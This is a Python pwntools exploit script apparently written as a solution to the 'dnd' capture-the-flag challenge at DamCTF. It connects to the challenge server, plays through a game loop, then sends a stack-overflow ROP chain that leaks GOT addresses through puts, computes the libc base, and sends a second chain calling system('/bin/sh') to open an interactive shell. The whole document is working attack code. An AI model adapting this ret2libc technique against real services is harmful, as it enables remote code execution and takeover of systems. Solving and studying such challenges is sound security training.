from pwn import *

# context.log_level = 'debug'
# context.binary = './dnd'
elf = ELF('./dnd')

def win(shell):
    did_win = False
    while not did_win:
        did_win = try_to_win(shell)
        
def try_to_win(shell):
    round = 0

    while round < 5:
        shell.recvuntil(f'>>> Round {round + 1}'.encode())
        shell.recvline()
        stats_line = shell.recvline().decode('utf-8')
        if stats_line.startswith('Points: -'):
            break

        p = shell.recvuntil('Do you want to [a]ttack or [r]un? ')
        print(p.decode('utf-8'), end='')
        shell.sendline(b'a')
        print('a')
        round += 1

    if round == 5:
        shell.close()
        return False

    for i in range(round, 5):
        shell.recvuntil(b'Do you want to [a]ttack or [r]un?')
        shell.sendline(b'r')
    
    shell.recvuntil(b'What is your name, fierce warrior? ')
    
    return True
    
shell = connect('dnd.chals.damctf.xyz', 30813)
win(shell)

dummy_rbp = b'B' * 8

pop_rdi_pop_rbp_ret = p64(0x0000000000402640) # pop rdi ; nop ; pop rbp ; ret
ret = p64(0x000000000040201a) # ret

plt_puts_addr = p64(elf.plt.puts)
got_puts_addr = p64(elf.got.puts)
got_fgets_addr = p64(elf.got.fgets)
got_rand_addr = p64(elf.got.rand)
got_srand_addr = p64(elf.got.srand)
# got_strlen_addr = p64(elf.got.strlen)
# got_strchr_addr = p64(elf.got.strchr)
main_fn_addr = p64(0x00402988)

payload = flat(
    b'A' * 0x68,
    pop_rdi_pop_rbp_ret + got_puts_addr + dummy_rbp + plt_puts_addr,
    pop_rdi_pop_rbp_ret + got_fgets_addr + dummy_rbp + plt_puts_addr,
    pop_rdi_pop_rbp_ret + got_rand_addr + dummy_rbp + plt_puts_addr,
    pop_rdi_pop_rbp_ret + got_srand_addr + dummy_rbp + plt_puts_addr,
    # pop_rdi_pop_rbp_ret + got_strlen_addr + dummy_rbp + plt_puts_addr,
    # pop_rdi_pop_rbp_ret + got_strchr_addr + dummy_rbp + plt_puts_addr,
    main_fn_addr,
    b'\0',
)

shell.sendline(payload)

shell.recvuntil(b'A' * 32)
output = shell.recvuntil(b'##### Welcome to the DamCTF and Dragons').split(b'\n')


print('output:', output)
leaked_puts_addr = u64(output[1].ljust(8, b'\x00'))
leaked_fgets_addr = u64(output[2].ljust(8, b'\x00'))
leaked_rand_addr = u64(output[3].ljust(8, b'\x00'))
leaked_srand_addr = u64(output[4].ljust(8, b'\x00'))
# leaked_strlen_addr = u64(output[5].ljust(8, b'\x00'))
# leaked_strchr_addr = u64(output[6].ljust(8, b'\x00'))

print('Got GOT addresses:')
print(f' - puts: {hex(leaked_puts_addr)}')
print(f' - fgets: {hex(leaked_fgets_addr)}')
print(f' - rand: {hex(leaked_rand_addr)}')
print(f' - srand: {hex(leaked_srand_addr)}')
# print(f' - strlen: {hex(leaked_strlen_addr)}')
# print(f' - strchr: {hex(leaked_strchr_addr)}')

if not try_to_win(shell):
    print('Failed to win')
    shell.close()
    exit(1)
    
libc = ELF('./libc.so.6')
libc_base = leaked_fgets_addr - libc.symbols['fgets']

system_addr = libc_base + libc.symbols['system']
fgets_addr = libc_base + libc.symbols['fgets']
rand_addr = libc_base + libc.symbols['rand']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))


print('Got dynamic addresses:')
print(f' - system: {hex(system_addr)}')
print(f' - fgets: {hex(fgets_addr)}')
print(f' - rand: {hex(rand_addr)}')
print(f' - bin_sh: {hex(bin_sh_addr)}')
print(f' - offset: {libc_base}')

payload = flat(
    b'A' * 0x68,
    ret,
    # print "/bin/sh"
    pop_rdi_pop_rbp_ret + p64(bin_sh_addr) + dummy_rbp + plt_puts_addr,
    # run system("/bin/sh")
    pop_rdi_pop_rbp_ret + p64(bin_sh_addr) + dummy_rbp + p64(system_addr),
    b'\0',
)
shell.sendline(payload)
shell.interactive()